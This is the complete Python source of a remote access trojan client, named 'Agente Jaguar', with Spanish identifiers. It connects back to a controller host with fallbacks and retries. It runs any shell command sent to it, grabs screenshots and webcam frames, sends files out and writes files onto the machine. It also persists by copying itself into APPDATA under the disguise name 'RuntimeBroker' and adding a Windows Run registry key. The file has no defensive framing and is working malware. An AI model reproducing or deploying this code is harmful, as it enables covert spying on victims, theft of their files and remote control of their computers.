# -*- coding: utf-8 -*-
"""Agente Jaguar - payload cliente."""
import os
import sys
import io
import time
import base64
import socket
import getpass
import platform
import subprocess

NOMBRE = "RuntimeBroker"
DIR_PERSIST = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                           "Microsoft", "Windows", NOMBRE)


def _leer_config():
    host = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("JAGUAR_HOST", "127.0.0.1")
    puerto = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("JAGUAR_PORT", "8000")
    fallback = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("JAGUAR_HOST2", "")
    try:
        puerto = int(puerto)
    except Exception:
        puerto = 8000
    return (host or "127.0.0.1"), puerto, (fallback or "")


def _shell(comando):
    r = subprocess.run(comando, shell=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT)
    salida = r.stdout or b""
    try:
        return salida.decode("utf-8")
    except UnicodeDecodeError:
        return salida.decode("cp1252", "replace")


def _sysinfo():
    return ("host={}\nuser={}\nos={}\narch={}\npid={}\nexe={}\ncwd={}".format(
        platform.node(), getpass.getuser(), platform.platform(),
        platform.machine(), os.getpid(), sys.executable, os.getcwd()))


def _screenshot():
    from PIL import ImageGrab
    try:
        img = ImageGrab.grab(all_screens=True)
    except TypeError:
        img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _webcam():
    import cv2
    cap = cv2.VideoCapture(0)
    try:
        ok, frame = cap.read()
        if not ok:
            return None
        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
        return buf.tobytes() if ok else None
    finally:
        cap.release()


def _persist():
    import shutil
    os.makedirs(DIR_PERSIST, exist_ok=True)
    if getattr(sys, "frozen", False):
        origen = sys.executable
        destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
        shutil.copy2(origen, destino)
        arranque = f'"{destino}"'
    else:
        origen = os.path.abspath(__file__)
        destino = os.path.join(DIR_PERSIST, "agente.py")
        shutil.copy2(origen, destino)
        arranque = f'pythonw "{destino}"'
    host, puerto, fb = _leer_config()
    arranque += f" {host} {puerto} {fb}"
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, arranque)
        winreg.CloseKey(k)
    except Exception as e:
        return f"persist parcial ({e}) -> {destino}"
    return f"persistencia instalada -> {destino}"


class Cliente:
    def __init__(self, host, puerto):
        self.host = host
        self.puerto = puerto
        self.sock = None
        self.buf = b""

    def conectar(self, timeout=10):
        s = socket.create_connection((self.host, self.puerto), timeout=timeout)
        s.settimeout(None)
        self.sock = s
        self.buf = b""

    def _linea(self):
        while b"\n" not in self.buf:
            d = self.sock.recv(4096)
            if not d:
                return None
            self.buf += d
        ln, _, self.buf = self.buf.partition(b"\n")
        return ln.decode("utf-8", "replace").strip()

    def enviar(self, tipo, datos):
        if isinstance(datos, str):
            datos = datos.encode("utf-8", "replace")
        self.sock.sendall(f"{tipo} {len(datos)}\n".encode("ascii") + datos)


def _bucle(cli, cwd):
    while True:
        linea = cli._linea()
        if linea is None:
            return cwd
        if not linea.strip():
            continue
        baja = linea.strip().lower()

        if baja in ("exit", "quit"):
            try:
                cli.sock.close()
            except Exception:
                pass
            raise SystemExit(0)

        if baja == "ping":
            cli.enviar("PONG", b"")

        elif baja == "sysinfo":
            cli.enviar("TXT", _sysinfo())

        elif baja == "screenshot":
            try:
                cli.enviar("IMG", _screenshot())
            except Exception as e:
                cli.enviar("ERR", str(e))

        elif baja == "webcam":
            try:
                d = _webcam()
                cli.enviar("IMG", d) if d else cli.enviar("ERR", "sin camara")
            except Exception as e:
                cli.enviar("ERR", str(e))

        elif baja == "persist":
            cli.enviar("TXT", _persist())

        elif baja.startswith("cd"):
            destino = linea[2:].lstrip(" :") or "~"
            try:
                os.chdir(os.path.expanduser(destino))
                cwd = os.getcwd()
                cli.enviar("TXT", cwd)
            except Exception as e:
                cli.enviar("ERR", str(e))

        elif baja.startswith("download"):
            ruta = linea[8:].lstrip(" :")
            try:
                with open(os.path.expanduser(ruta), "rb") as f:
                    cli.enviar("FILE", f.read())
            except Exception as e:
                cli.enviar("ERR", str(e))

        elif baja.startswith("write"):
            ruta, _, b64 = linea[5:].lstrip(" :").partition("|")
            try:
                with open(os.path.expanduser(ruta.strip()), "wb") as f:
                    f.write(base64.b64decode(b64))
                cli.enviar("TXT", "escrito " + ruta.strip())
            except Exception as e:
                cli.enviar("ERR", str(e))

        else:
            comando = linea[6:].lstrip(" :") if baja.startswith("shell") else linea
            try:
                cli.enviar("TXT", _shell(comando))
            except Exception as e:
                cli.enviar("ERR", str(e))


def main():
    host, puerto, fallback = _leer_config()
    objetivos = []
    for h in (host, fallback, "127.0.0.1"):
        if h and h not in [o[0] for o in objetivos]:
            objetivos.append((h, puerto))

    cwd = os.getcwd()
    idx = 0
    while True:
        h, p = objetivos[idx % len(objetivos)]
        idx += 1
        try:
            cli = Cliente(h, p)
            cli.conectar()
            cli.enviar("HELLO", "{}|{}|{} {}|{}".format(
                platform.node(), getpass.getuser(),
                platform.system(), platform.release(), platform.machine()))
            cwd = _bucle(cli, cwd)
        except SystemExit:
            return
        except Exception:
            time.sleep(3)


if __name__ == "__main__":
    main()